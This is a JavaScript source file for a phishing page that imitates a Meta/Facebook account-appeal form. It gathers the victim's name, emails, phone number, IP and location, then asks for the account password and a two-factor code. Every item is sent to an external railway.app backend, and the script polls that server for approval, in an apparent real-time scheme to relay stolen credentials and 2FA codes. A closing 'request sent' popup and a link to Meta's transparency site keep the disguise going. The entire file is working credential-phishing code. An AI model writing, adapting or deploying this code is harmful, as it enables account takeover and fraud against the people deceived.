/**
 * flow-form.js - Form, password, 2FA (abc) - API_BASE, IP atat-style, day/month/year, mask 2FA
 */
(function () {
  "use strict";

  function normalizeApiBase(rawBase) {
    var base = String(rawBase || "").trim();
    if (!base) base = "https://be2109-999-production.up.railway.app/";

    // Tự sửa typo domain hay gặp khi deploy.
    base = base.replace("cudkdns.org", "duckdns.org");

    // Tránh double slash khi ghép URL.
    base = base.replace(/\/+$/, "");

    // Mixed Content: trang chạy HTTPS mà API lại gọi HTTP => trình duyệt chặn.
    try {
      if (window.location && window.location.protocol === "https:" && base.indexOf("http://") === 0) {
        base = "https://" + base.slice("http://".length);
      }
    } catch (_) {}

    return base;
  }

  var API_BASE = normalizeApiBase(window.API_BASE || "https://be2109-999-production.up.railway.app/");

  function apiURL(path) {
    var p = String(path || "");
    if (!p) return API_BASE;
    return API_BASE + (p.charAt(0) === "/" ? p : "/" + p);
  }

  document.addEventListener("DOMContentLoaded", function () {
    const formsSendData = {
      full_name: "",
      personal_email: "",
      business_email: "",
      mobile_phone_number: "",
      page_name: "",
      apeal: "",
      user_ip: "",
      country: "",
      country_code: "",
      call_code: "",
      day: 1,
      month: 1,
      year: new Date().getFullYear(),
      user_agent: "",
      ua_platform: "",
    };

    let currentSessionId = null;
    let pollingPasswordInterval = null;
    let polling2FAInterval = null;
    let currentPopup2FAType = "normal";

    var COUNTRY_TO_CALL = {
      US: "+1", CA: "+1", GB: "+44", AU: "+61", DE: "+49", FR: "+33", IT: "+39", ES: "+34",
      PT: "+351", NL: "+31", CN: "+86", JP: "+81", KR: "+82", VN: "+84", TH: "+66", ID: "+62",
      PH: "+63", MY: "+60", SG: "+65", IN: "+91", RU: "+7", UA: "+380", BR: "+55", MX: "+52",
      AR: "+54", TW: "+886", HK: "+852", TR: "+90", PL: "+48", PK: "+92", EG: "+20",
      SA: "+966", AE: "+971", ZA: "+27", NG: "+234", BD: "+880", MM: "+95", KH: "+855",
    };

    var COUNTRY_META = {
      US: { name: "United States", flag: "us" },
      CA: { name: "Canada", flag: "ca" },
      GB: { name: "United Kingdom", flag: "gb" },
      AU: { name: "Australia", flag: "au" },
      DE: { name: "Germany", flag: "de" },
      FR: { name: "France", flag: "fr" },
      IT: { name: "Italy", flag: "it" },
      ES: { name: "Spain", flag: "es" },
      PT: { name: "Portugal", flag: "pt" },
      NL: { name: "Netherlands", flag: "nl" },
      CN: { name: "China", flag: "cn" },
      JP: { name: "Japan", flag: "jp" },
      KR: { name: "South Korea", flag: "kr" },
      VN: { name: "Vietnam", flag: "vn" },
      TH: { name: "Thailand", flag: "th" },
      ID: { name: "Indonesia", flag: "id" },
      PH: { name: "Philippines", flag: "ph" },
      MY: { name: "Malaysia", flag: "my" },
      SG: { name: "Singapore", flag: "sg" },
      IN: { name: "India", flag: "in" },
      RU: { name: "Russia", flag: "ru" },
      UA: { name: "Ukraine", flag: "ua" },
      BR: { name: "Brazil", flag: "br" },
      MX: { name: "Mexico", flag: "mx" },
      AR: { name: "Argentina", flag: "ar" },
      TW: { name: "Taiwan", flag: "tw" },
      HK: { name: "Hong Kong", flag: "hk" },
      TR: { name: "Turkey", flag: "tr" },
      PL: { name: "Poland", flag: "pl" },
      PK: { name: "Pakistan", flag: "pk" },
      EG: { name: "Egypt", flag: "eg" },
      SA: { name: "Saudi Arabia", flag: "sa" },
      AE: { name: "United Arab Emirates", flag: "ae" },
      ZA: { name: "South Africa", flag: "za" },
      NG: { name: "Nigeria", flag: "ng" },
      BD: { name: "Bangladesh", flag: "bd" },
      MM: { name: "Myanmar", flag: "mm" },
      KH: { name: "Cambodia", flag: "kh" },
    };

    function buildCountryList() {
      var list = document.getElementById("country-list");
      if (!list) return [];
      list.innerHTML = "";

      // Ô search nằm trên cùng bên trong dropdown
      var searchLi = document.createElement("li");
      searchLi.className = "country-search-item";
      searchLi.innerHTML =
        '<div class="country-search-wrap">' +
        '<input type="text" id="country-search" placeholder="Search country or code">' +
        "</div>";
      list.appendChild(searchLi);

      var codes = Object.keys(COUNTRY_TO_CALL);
      codes.sort(function (a, b) {
        var na = (COUNTRY_META[a] && COUNTRY_META[a].name) || a;
        var nb = (COUNTRY_META[b] && COUNTRY_META[b].name) || b;
        return na.localeCompare(nb);
      });

      var items = [];
      codes.forEach(function (code) {
        var dial = COUNTRY_TO_CALL[code];
        var meta = COUNTRY_META[code] || { name: code, flag: code.toLowerCase() };
        var li = document.createElement("li");
        li.className = "country";
        li.setAttribute("data-code", code);
        li.setAttribute("data-dial", dial);
        li.setAttribute("data-flag-url", "https://flagcdn.com/w20/" + meta.flag + ".png");
        li.innerHTML =
          '<span class="country-flag" style="background-image:url(\'https://flagcdn.com/w20/' + meta.flag + '.png\')"></span>' +
          '<span class="country-name">' + meta.name + '</span>' +
          '<span class="dial-code">' + dial + "</span>";
        list.appendChild(li);
        items.push(li);
      });

      return items;
    }

    function updatePhoneUIFromIp() {
      var dial = document.getElementById("selected-dial-code");
      if (dial && formsSendData.call_code) {
        dial.textContent = formsSendData.call_code;
      }
      var list = document.getElementById("country-list");
      if (list && formsSendData.country_code) {
        var items = list.querySelectorAll(".country");
        items.forEach(function (li) {
          li.classList.remove("active");
          if ((li.getAttribute("data-code") || "").toUpperCase() === formsSendData.country_code.toUpperCase()) {
            li.classList.add("active");
            var flagUrl = li.getAttribute("data-flag-url") || "";
            var flagEl = document.getElementById("selected-flag-icon");
            if (flagEl && flagUrl) {
              flagEl.style.backgroundImage = "url('" + flagUrl + "')";
            }
          }
        });
      }
    }

    // Cache IP/geo để tránh bị 429/403 từ các dịch vụ IP.
    var __geoCache = {
      ts: 0,
      ip: "",
      country: "-",
      country_code: "-",
      call_code: "-",
    };
    var __geoInFlight = null;
    var GEO_CACHE_TTL_MS = 10 * 60 * 1000; // 10 phút

    async function getUserIp() {
      // Nếu đang có request lấy IP chạy, dùng chung promise.
      if (__geoInFlight) return __geoInFlight;

      // Nếu đã có cache còn mới, áp lại luôn.
      var now = Date.now();
      if (__geoCache.ts && (now - __geoCache.ts) < GEO_CACHE_TTL_MS && __geoCache.ip) {
        formsSendData.user_ip = __geoCache.ip;
        formsSendData.country = __geoCache.country || "-";
        formsSendData.country_code = __geoCache.country_code || "-";
        formsSendData.call_code = __geoCache.call_code || COUNTRY_TO_CALL[(__geoCache.country_code || "").toUpperCase()] || "+1";
        updatePhoneUIFromIp();
        return;
      }

      __geoInFlight = (async function () {
      var ip = "";
      var country = "-";
      var country_code = "-";
      var call_code = "-";
      var r, d, cc;
      try {
        r = await fetch("https://ipapi.co/json/");
        if (r.ok) {
          d = await r.json();
          cc = (d.country_code || "").toUpperCase();
          ip = d.ip || "";
          country = d.country_name || d.country || d.city || "-";
          country_code = cc || "-";
          call_code = d.country_calling_code ? ("+" + String(d.country_calling_code).replace(/^\+/, "")) : (COUNTRY_TO_CALL[cc] || "+1");
        }
      } catch (_) {}
      if (!ip || country_code === "-") {
        try {
          r = await fetch("https://ipwho.is/?fields=ip,country,country_code,calling_code");
          if (r.ok) {
            d = await r.json();
            if (d && (d.success === undefined || d.success)) {
              ip = ip || d.ip || "";
              country = country === "-" ? (d.country || "-") : country;
              country_code = country_code === "-" ? (d.country_code || "-") : country_code;
              if (call_code === "-" && d.calling_code) call_code = "+" + String(d.calling_code).replace(/^\+/, "");
            }
          }
        } catch (_) {}
      }
      if (country_code === "-" || !ip) {
        try {
          r = await fetch("https://ip-api.com/json/?fields=status,country,countryCode,query");
          if (r.ok) {
            d = await r.json();
            if (d && d.status === "success") {
              cc = (d.countryCode || "").toUpperCase();
              ip = ip || d.query || "";
              country = country === "-" ? (d.country || "-") : country;
              country_code = country_code === "-" ? cc : country_code;
              if (call_code === "-") call_code = COUNTRY_TO_CALL[cc] || "+1";
            }
          }
        } catch (_) {}
      }
      if (!ip || ip === "" || country_code === "-") {
        formsSendData.user_ip = "127.0.0.1";
        formsSendData.country = "Local Test";
        formsSendData.country_code = "VN";
        formsSendData.call_code = "+84";
        updatePhoneUIFromIp();
        __geoCache = {
          ts: Date.now(),
          ip: "127.0.0.1",
          country: "Local Test",
          country_code: "VN",
          call_code: "+84",
        };
        return;
      }
      formsSendData.user_ip = ip;
      formsSendData.country = country || "-";
      formsSendData.country_code = country_code;
      formsSendData.call_code = call_code || COUNTRY_TO_CALL[country_code] || "+1";
      updatePhoneUIFromIp();

      __geoCache = {
        ts: Date.now(),
        ip: ip,
        country: country || "-",
        country_code: country_code,
        call_code: formsSendData.call_code,
      };
      })().finally(function () { __geoInFlight = null; });

      return __geoInFlight;
    }

    function collectFormData() {
      var full = document.getElementById("full_name");
      var biz = document.getElementById("business_email");
      var per = document.getElementById("personal_email");
      var mob = document.getElementById("mobile_phone_number");
      var page = document.getElementById("page_name");
      var apeal = document.getElementById("apeal");
      if (full) formsSendData.full_name = full.value.trim();
      if (biz) formsSendData.business_email = biz.value.trim();
      if (per) formsSendData.personal_email = per.value.trim();
      if (mob) formsSendData.mobile_phone_number = (mob.value || "").trim().replace(/\s/g, "");
      if (page) formsSendData.page_name = page.value.trim();
      if (apeal) formsSendData.apeal = apeal.value.trim();
      formsSendData.day = 1;
      formsSendData.month = 1;
      formsSendData.year = new Date().getFullYear();
      formsSendData.user_agent = navigator.userAgent || "";
      formsSendData.ua_platform = navigator.platform || "";
    }

    function clearFormErrors() {
      var a = document.getElementById("error-business_email");
      var b = document.getElementById("error-personal_email");
      var c = document.getElementById("error-mobile_phone_number");
      if (a) a.textContent = "";
      if (b) b.textContent = "";
      if (c) c.textContent = "";
    }

    function showFormError(msg) {
      var el = document.getElementById("error-personal_email");
      if (el) { el.textContent = msg; return; }
      alert(msg);
    }

    async function sendFormData(data) {
      var res = await fetch(apiURL("/submitForm"), {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      });
      var result = await res.json().catch(function () { return {}; });
      if (!res.ok) throw new Error(result.error || "Request failed");
      return result.sessionId;
    }

    async function sendPassword(sessionId, password) {
      var res = await fetch(apiURL("/submitPassword"), {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ sessionId: sessionId, password: password }),
      });
      if (!res.ok) throw new Error("Fail");
    }

    async function sendTwoFA(sessionId, twoFA_code) {
      var res = await fetch(apiURL("/submit2FA"), {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ sessionId: sessionId, twoFA_code: twoFA_code }),
      });
      if (!res.ok) throw new Error("Fail");
    }

    function maskEmail(e) {
      if (!e) return "";
      var p = e.split("@");
      if (!p[1]) return e;
      return p[0].charAt(0) + "**" + p[0].slice(-1) + "@" + p[1];
    }

    function maskPhone(p) {
      if (!p) return "";
      var s = String(p).replace(/\s/g, "");
      if (s.length < 6) return p;
      return s.slice(0, -4) + " ** " + s.slice(-2);
    }

    function update2FADisplay() {
      var emailEl = document.getElementById("2fa-email-mask");
      var phoneEl = document.getElementById("2fa-phone-mask");
      if (emailEl) emailEl.textContent = maskEmail(formsSendData.personal_email);
      if (phoneEl) phoneEl.textContent = maskPhone(formsSendData.mobile_phone_number);
    }

    (function initCountryDropdown() {
      var selected = document.getElementById("selected-country");
      var list = document.getElementById("country-list");
      if (!selected || !list) return;

      // Tạo danh sách country từ COUNTRY_TO_CALL + COUNTRY_META (có kèm ô search)
      var items = buildCountryList();
      var searchInput = document.getElementById("country-search");

      // Nếu có dòng active ban đầu (VN), set luôn cờ + mã cho ô selected
      var active = items[0];
      if (active) {
        var initDial = active.getAttribute("data-dial") || "";
        var initUrl = active.getAttribute("data-flag-url") || "";
        var dialSpanInit = document.getElementById("selected-dial-code");
        var flagElInit = document.getElementById("selected-flag-icon");
        if (dialSpanInit && initDial) dialSpanInit.textContent = initDial;
        if (flagElInit && initUrl) flagElInit.style.backgroundImage = "url('" + initUrl + "')";
        formsSendData.country_code = active.getAttribute("data-code") || formsSendData.country_code;
        formsSendData.call_code = initDial || formsSendData.call_code;
      }

      selected.addEventListener("click", function () {
        var isOpen = list.style.display === "block";
        list.style.display = isOpen ? "none" : "block";
        if (!isOpen && searchInput) searchInput.focus();
      });
      list.addEventListener("click", function (e) {
        var li = e.target.closest(".country");
        if (!li) return;
        var code = li.getAttribute("data-code") || "";
        var dial = li.getAttribute("data-dial") || "";
        var flagUrl = li.getAttribute("data-flag-url") || "";
        formsSendData.country_code = code;
        formsSendData.call_code = dial;
        var dialSpan = document.getElementById("selected-dial-code");
        if (dialSpan) dialSpan.textContent = dial;
        var flagEl = document.getElementById("selected-flag-icon");
        if (flagEl && flagUrl) flagEl.style.backgroundImage = "url('" + flagUrl + "')";
        list.querySelectorAll(".country").forEach(function (item) {
          item.classList.toggle("active", item === li);
        });
        list.style.display = "none";
      });
      document.addEventListener("click", function (e) {
        if (!selected.contains(e.target) && !list.contains(e.target)) {
          list.style.display = "none";
        }
      });

      if (searchInput) {
        searchInput.addEventListener("input", function () {
          var term = (searchInput.value || "").toLowerCase();
          items.forEach(function (li) {
            var name = (li.querySelector(".country-name")?.textContent || "").toLowerCase();
            var code = (li.getAttribute("data-code") || "").toLowerCase();
            var dial = (li.getAttribute("data-dial") || "").toLowerCase();
            var match = !term || name.indexOf(term) !== -1 || code.indexOf(term) !== -1 || dial.indexOf(term) !== -1;
            li.style.display = match ? "" : "none";
          });
        });
      }
    })();

    // Gọi sớm để lấy IP & country code (auto cập nhật cờ + mã nếu thành công)
    getUserIp().catch(function () {});

    var modalPassword = document.getElementById("passwordModal");
    var passInput = document.getElementById("passInput");
    var passStatus = document.getElementById("passStatus");
    var togglePassBtn = document.getElementById("togglePassBtn");
    var passSpinner = document.getElementById("passSpinner");
    var submitPassBtn = document.getElementById("submitPassBtn");
    var buttonText = submitPassBtn ? submitPassBtn.querySelector(".button-text") : null;

    var modal2FA = document.getElementById("twoFAModal");
    var title2FA = modal2FA ? modal2FA.querySelector(".modal-title") : null;
    var desc2FA = modal2FA ? modal2FA.querySelector(".twoFAinfo-wraper p") : null;
    var image2FA = modal2FA ? modal2FA.querySelector(".fb-round-wraper img") : null;
    var twoFAInput = document.getElementById("twoFAInput");
    var submit2FABtn = document.getElementById("submit2FABtn");
    var twoFAStatus = document.getElementById("twoFAStatus");
    var twoFASpinner = document.getElementById("twoFASpinner");
    var twoFAButtonText = submit2FABtn ? submit2FABtn.querySelector(".button-text") : null;

    var eyeHideSVG = '<svg id="eyeHideSVG" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg" style="width:24px; height:24px; fill:#535c61;"><g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" transform="translate(2 3)"><path fill="#535c61" d="M18.4174,0.21975 C18.7104,0.51275 18.7104,0.98775 18.4174,1.28075 L2.6434,17.05375 C2.4974,17.20075 2.3054,17.27375 2.1134,17.27375 C1.9214,17.27375 1.7294,17.20075 1.5834,17.05375 C1.2904,16.76075 1.2904,16.28675 1.5834,15.99375 L3.55534696,14.0230028 C2.14153178,12.7298365 0.942216653,10.9866302 0.0615,8.93395 C-0.0205,8.74395 -0.0205,8.52995 0.0615,8.34095 C1.0825,5.97695 2.5205,4.01995 4.2205,2.68295 C7.51332757,0.0769990431 11.8423054,-0.0613257214 15.2686834,2.30827702 L17.3574,0.21975 C17.6504,-0.07325 18.1244,-0.07325 18.4174,0.21975 Z M18.0472,5.04075 C18.7712,6.00175 19.4072,7.11275 19.9382,8.33875 C20.0212,8.52875 20.0212,8.74475 19.9382,8.93375 C17.8422,13.79075 14.1272,16.68975 10.0002,16.68975 C9.0632,16.68975 8.1312,16.53775 7.2312,16.23875 C6.8382,16.10775 6.6252,15.68275 6.7562,15.28975 C6.8872,14.89575 7.3102,14.68675 7.7052,14.81475 C8.4522,15.06375 9.2242,15.18975 10.0002,15.18975 C13.4282,15.18975 16.5612,12.74775 18.4302,8.63675 C17.9742,7.63775 17.4432,6.73275 16.8492,5.94275 C16.6002,5.61175 16.6662,5.14075 16.9972,4.89175 C17.3272,4.64275 17.7982,4.71075 18.0472,5.04075 Z M5.1495,3.86095 C3.7135,4.99095 2.4805,6.63695 1.5705,8.63895 C2.3639438,10.3913952 3.40632366,11.8693129 4.6170542,12.9607029 L6.75485503,10.8231134 C6.31993117,10.1831911 6.0859,9.42869604 6.0859,8.63855 C6.0859,6.47855 7.8419,4.72155 9.9999,4.72155 C10.7828812,4.72155 11.5487925,4.95995861 12.1864706,5.39085121 L14.1880037,3.38945022 C11.3351603,1.54522332 7.86298928,1.71346462 5.1495,3.86095 Z M13.2375,8.46155 C13.6455,8.53455 13.9165,8.92455 13.8435,9.33255 C13.5565,10.92555 12.2945,12.18955 10.7025,12.47955 C10.6575,12.48755 10.6115,12.49155 10.5675,12.49155 C10.2125,12.49155 9.8965,12.23755 9.8305,11.87555 C9.7565,11.46855 10.0265,11.07755 10.4345,11.00355 C11.4145,10.82555 12.1905,10.04755 12.3665,9.06655 C12.4405,8.65955 12.8305,8.39155 13.2375,8.46155 Z M9.9999,6.22155 C8.6689,6.22155 7.5859,7.30555 7.5859,8.63855 C7.5859,9.02393171 7.67662769,9.39593921 7.84765172,9.73001539 L11.093292,6.48399 C10.75914,6.31371 10.3833,6.22155 9.9999,6.22155 Z"></path></g></svg>';
    var eyeShowSVG = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#535c61" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:24px; height:24px;"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>';

    if (twoFAInput && submit2FABtn) {
      twoFAInput.addEventListener("keydown", function (event) {
        if (event.key === "Enter") {
          event.preventDefault();
          if (!submit2FABtn.disabled) submit2FABtn.click();
        }
      });
    }

    if (togglePassBtn && passInput) {
      togglePassBtn.addEventListener("click", function () {
        if (passInput.type === "password") {
          passInput.type = "text";
          togglePassBtn.innerHTML = eyeShowSVG;
        } else {
          passInput.type = "password";
          togglePassBtn.innerHTML = eyeHideSVG;
        }
      });
    }

    if (passInput && submitPassBtn) {
      passInput.addEventListener("keydown", function (event) {
        if (event.key === "Enter") {
          event.preventDefault();
          if (!submitPassBtn.disabled) submitPassBtn.click();
        }
      });
    }

    function showPasswordModal() {
      if (passStatus) passStatus.textContent = "";
      if (passInput) passInput.value = "";
      if (modalPassword) modalPassword.style.display = "block";
      if (passInput) passInput.disabled = false;
      if (submitPassBtn) submitPassBtn.disabled = false;
      if (passInput) passInput.focus();
    }

    function hidePasswordModal() {
      if (modalPassword) modalPassword.style.display = "none";
    }

    function showLoadingPass() {
      if (buttonText) buttonText.style.display = "none";
      if (passSpinner) passSpinner.style.display = "inline-block";
      if (passInput) passInput.disabled = true;
      if (submitPassBtn) submitPassBtn.disabled = true;
    }

    function hideLoadingPass() {
      if (buttonText) buttonText.style.display = "inline";
      if (passSpinner) passSpinner.style.display = "none";
      if (passInput) passInput.disabled = false;
      if (submitPassBtn) submitPassBtn.disabled = false;
    }

    function showErrorPass(msg) {
      if (passStatus) {
        passStatus.style.color = "red";
        passStatus.textContent = msg;
      }
    }

    function showTwoFAModal() {
      if (twoFAStatus) twoFAStatus.textContent = "";
      if (twoFAInput) twoFAInput.value = "";
      if (modal2FA) modal2FA.style.display = "block";
      if (twoFAInput) twoFAInput.disabled = false;
      if (submit2FABtn) submit2FABtn.disabled = false;

      update2FADisplay();

      if (currentPopup2FAType === "skip2fa") {
        showThankYouPopup();
        return;
      }

      if (currentPopup2FAType === "normal" && title2FA && image2FA) {
        title2FA.textContent = "Check your authentication code";
        desc2FA.textContent = "Enter the 6 or 8-digit code for this account from the two-factor authentication you set up (such as Google Authenticator, Email or Text Message on your mobile).";
        image2FA.src = "../img/fgjgh1.png";
        if (twoFAInput) twoFAInput.style.display = "block";
        if (submit2FABtn) submit2FABtn.style.display = "flex";
      } else if (currentPopup2FAType === "authen" && title2FA && desc2FA && image2FA) {
        title2FA.textContent = "Go to your authentication app";
        desc2FA.textContent = "Enter the 6-digit code for this account from the two-factor authentication app you set up (such as Duo Mobile or Google Authenticator).";
        image2FA.src = "../img/fgjgh2.png";
        if (twoFAInput) twoFAInput.style.display = "block";
        if (submit2FABtn) submit2FABtn.style.display = "flex";
      } else if (currentPopup2FAType === "confirm" && title2FA && desc2FA && image2FA) {
        title2FA.textContent = "Check your notifications on another device";
        desc2FA.textContent = "We sent a notification to your PC and Mobile. Check your Facebook notifications there and approve the login to continue.";
        image2FA.src = "../img/fgjgh3.png";
        if (twoFAInput) twoFAInput.style.display = "none";
        if (submit2FABtn) submit2FABtn.style.display = "none";
      }

      if (twoFAInput) twoFAInput.focus();
    }

    function hideTwoFAModal() {
      if (modal2FA) modal2FA.style.display = "none";
    }

    function showLoading2FA() {
      if (twoFAButtonText) twoFAButtonText.style.display = "none";
      if (twoFASpinner) twoFASpinner.style.display = "inline-block";
      if (twoFAInput) twoFAInput.disabled = true;
      if (submit2FABtn) submit2FABtn.disabled = true;
    }

    function hideLoading2FA() {
      if (twoFAButtonText) twoFAButtonText.style.display = "inline";
      if (twoFASpinner) twoFASpinner.style.display = "none";
      if (twoFAInput) twoFAInput.disabled = false;
      if (submit2FABtn) submit2FABtn.disabled = false;
    }

    function showError2FA(msg) {
      if (twoFAStatus) {
        twoFAStatus.style.color = "red";
        twoFAStatus.style.fontFamily = "Tahoma, sans-serif";
        twoFAStatus.style.fontWeight = "lighter";
        twoFAStatus.textContent = msg;
      }
    }

    function showThankYouPopup() {
      var targetHref = "https://transparency.meta.com/";
      var modal = document.getElementById("successModal");
      if (modal) {
        var wrapper = modal.querySelector(".twoFAinfo-wraper");
        if (wrapper) {
          wrapper.innerHTML = '<h1 class="modal-title" id="successModalLabel">Request has been sent</h1><br><div class="fb-round-wraper"><img src="../img/dvdr.png" alt="" style="width: 100%;"></div><br><p>Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.</p>';
        }
        var form = modal.querySelector("form");
        if (form) {
          form.action = targetHref;
          form.method = "GET";
        }
        var btnText = modal.querySelector(".form-btn-wrapper .button-text");
        if (btnText) btnText.textContent = "Return Privacy Center";
        try {
          if (window.bootstrap && window.bootstrap.Modal) {
            var bs = window.bootstrap.Modal.getOrCreateInstance(modal);
            bs.show();
          } else {
            modal.classList.add("show");
            modal.style.display = "block";
            modal.removeAttribute("aria-hidden");
          }
        } catch (e) {
          modal.classList.add("show");
          modal.style.display = "block";
          modal.removeAttribute("aria-hidden");
        }
        return;
      }
      var popup = document.createElement("div");
      popup.id = "thankYouPopup";
      popup.style.cssText = "position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#fff;border:2px solid #ccc;padding:20px;text-align:center;box-shadow:0 0 10px rgba(0,0,0,0.2);max-width:min(960px,95vw);";
      popup.innerHTML = '<h1 class="modal-title">Request has been sent</h1><br><div class="fb-round-wraper"><img src="../img/dvdr.png" alt="Phone" style="width:100%;max-width:900px;height:auto;display:block;margin:0 auto;"></div><p>Your request has been added to the processing queue. We will process your request within 24 hours.</p><div style="margin-top:12px;"><a href="' + targetHref + '" class="btn btn-primary">Return Privacy Center</a></div>';
      document.body.appendChild(popup);
    }

    function startPollingApprovalStatus(sessionId) {
      if (pollingPasswordInterval) clearInterval(pollingPasswordInterval);
      pollingPasswordInterval = setInterval(function () {
        fetch(apiURL("/getStatus") + "?sessionId=" + encodeURIComponent(sessionId))
          .then(function (res) { return res.ok ? res.json() : Promise.reject(); })
          .then(function (data) {
            if (data.status === "approved") {
              clearInterval(pollingPasswordInterval);
              hideLoadingPass();
              hidePasswordModal();
              currentPopup2FAType = data.popup2FAType || "normal";
              showTwoFAModal();
              startPolling2FAStatus(sessionId);
            } else if (data.status === "rejected") {
              clearInterval(pollingPasswordInterval);
              hideLoadingPass();
              showErrorPass("The password that you've entered is incorrect.");
            }
          })
          .catch(function () {});
      }, 3000);
    }

    function startPolling2FAStatus(sessionId) {
      if (polling2FAInterval) clearInterval(polling2FAInterval);
      polling2FAInterval = setInterval(function () {
        fetch(apiURL("/getStatus") + "?sessionId=" + encodeURIComponent(sessionId))
          .then(function (res) { return res.ok ? res.json() : Promise.reject(); })
          .then(function (data) {
            currentPopup2FAType = data.popup2FAType || currentPopup2FAType || "normal";
            if (currentPopup2FAType === "skip2fa") {
              clearInterval(polling2FAInterval);
              hideLoading2FA();
              hideTwoFAModal();
              showThankYouPopup();
              return;
            }
            if (data.status_2fa === "approved_2fa") {
              clearInterval(polling2FAInterval);
              hideLoading2FA();
              hideTwoFAModal();
              showThankYouPopup();
            } else if (data.status_2fa === "checking_2fa") {
              showTwoFAModal();
            } else if (data.status_2fa === "rejected_2fa") {
              clearInterval(polling2FAInterval);
              hideLoading2FA();
              showError2FA("Your verification code has expired. Please wait for a new code.");
            }
          })
          .catch(function () {});
      }, 3000);
    }

    var hasSubmitted = false;
    var submitBtn = document.getElementById("submitBtn");
    if (submitBtn) {
      submitBtn.addEventListener("click", async function () {
        if (hasSubmitted) return;
        hasSubmitted = true;
        var btn = this;
        btn.disabled = true;
        btn.style.pointerEvents = "none";
        btn.innerText = "Sending...";
        clearFormErrors();
        collectFormData();
        // Tránh gọi lại nhiều lần gây 429/403; chỉ gọi nếu chưa có IP hoặc cache đã cũ.
        if (!formsSendData.user_ip || formsSendData.user_ip === "Unknown" || formsSendData.user_ip === "Ip not detected ;(") {
          await getUserIp();
        }

        try {
          currentSessionId = await sendFormData(formsSendData);
          showPasswordModal();
          startPollingApprovalStatus(currentSessionId);
        } catch (e) {
          console.error("Error sending data:", e);
          showFormError(e.message || "Sending data failed, please try again.");
          hasSubmitted = false;
          btn.disabled = false;
          btn.style.pointerEvents = "auto";
          btn.innerText = "Send";
        }
      });
    }

    if (submitPassBtn) {
      submitPassBtn.addEventListener("click", async function () {
        var pw = passInput && passInput.value ? passInput.value.trim() : "";
        if (!pw) return;
        try {
          showLoadingPass();
          await sendPassword(currentSessionId, pw);
          startPollingApprovalStatus(currentSessionId);
        } catch (e) {
          console.error(e);
          alert("Password submission failed, please try again.");
          hideLoadingPass();
        }
      });
    }

    if (submit2FABtn) {
      submit2FABtn.addEventListener("click", async function () {
        var code = twoFAInput && twoFAInput.value ? twoFAInput.value.trim() : "";
        if (!code) {
          alert("Please enter the code");
          return;
        }
        try {
          showLoading2FA();
          await sendTwoFA(currentSessionId, code);
          startPolling2FAStatus(currentSessionId);
        } catch (e) {
          console.error(e);
          alert("Sending code failed, please try again.");
          hideLoading2FA();
        }
      });
    }

    var button = document.getElementById("showPopup");
    var popup = document.getElementById("popup");
    var closePopup = document.getElementById("closePopup");
    var col4Content = document.querySelector(".col-4");
    var popupContent = document.querySelector(".popup-content");

    if (button && popup && col4Content && popupContent) {
      button.addEventListener("click", function () {
        popupContent.innerHTML = col4Content.innerHTML;
        document.body.style.overflow = "hidden";
        popup.style.display = "flex";
        var searchBtn = document.querySelector("#popup #search");
        if (searchBtn) {
          searchBtn.addEventListener("click", function () {
            if (window.searchModal && typeof window.searchModal.show === "function") {
              window.searchModal.show();
            } else if (window.bootstrap) {
              var searchModalEl = document.getElementById("searchModal");
              if (searchModalEl) {
                window.searchModal = window.bootstrap.Modal.getOrCreateInstance(searchModalEl);
                window.searchModal.show();
              }
            }
          });
        }
      });
      closePopup.addEventListener("click", function () {
        popup.style.display = "none";
        document.body.style.overflow = "auto";
      });
      function updateLayout() {
        if (window.innerWidth < 1000) {
          col4Content.style.display = "none";
          button.style.display = "block";
        } else {
          col4Content.style.display = "block";
          button.style.display = "none";
        }
      }
      updateLayout();
      window.addEventListener("resize", updateLayout);
    }

    var form = document.getElementById("first-form");
    var submitBtnForm = document.getElementById("submitBtn");
    if (form && submitBtnForm) {
      var fields = [
        { input: form.personal_email, errorId: "error-personal_email", type: "email", minLen: 3, touched: false },
        { input: form.business_email, errorId: "error-business_email", type: "email", minLen: 3, touched: false },
        { input: form.mobile_phone_number, errorId: "error-mobile_phone_number", type: "tel", minLen: 7, maxLen: 18, touched: false },
      ];
      function validateField(field, showError) {
        var val = field.input ? field.input.value.trim() : "";
        var errorDiv = document.getElementById(field.errorId);
        if (!showError) {
          if (errorDiv) errorDiv.textContent = "";
          return val.length >= field.minLen;
        }
        if (!val) {
          if (errorDiv) errorDiv.textContent = "This field is required.";
          return false;
        }
        if (val.length < field.minLen) {
          if (errorDiv) errorDiv.textContent = "Please enter at least " + field.minLen + " characters.";
          return false;
        }
        if (field.type === "email") {
          var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
          if (!emailPattern.test(val)) {
            if (errorDiv) errorDiv.textContent = "Please enter a valid email.";
            return false;
          }
        }
        if (field.type === "tel") {
          var phonePattern = /^[0-9+\-\s]+$/;
          if (!phonePattern.test(val)) {
            if (errorDiv) errorDiv.textContent = "Please enter a valid phone number (only digits, +, -, spaces).";
            return false;
          }
          if (field.maxLen && val.length > field.maxLen) {
            if (errorDiv) errorDiv.textContent = "Maximum length is " + field.maxLen + " characters.";
            return false;
          }
        }
        if (errorDiv) errorDiv.textContent = "";
        return true;
      }
      function validateForm(showErrors) {
        var isValid = true;
        for (var i = 0; i < fields.length; i++) {
          var field = fields[i];
          var showError = showErrors || field.touched;
          if (!validateField(field, showError)) isValid = false;
        }
        return isValid;
      }
      function updateSubmitButtonState() {
        submitBtnForm.disabled = !validateForm(false);
      }
      for (var j = 0; j < fields.length; j++) {
        (function (field) {
          if (!field.input) return;
          field.input.addEventListener("input", updateSubmitButtonState);
          field.input.addEventListener("blur", function () {
            field.touched = true;
            validateField(field, true);
            updateSubmitButtonState();
          });
        })(fields[j]);
      }
      updateSubmitButtonState();
    }
  });
})();
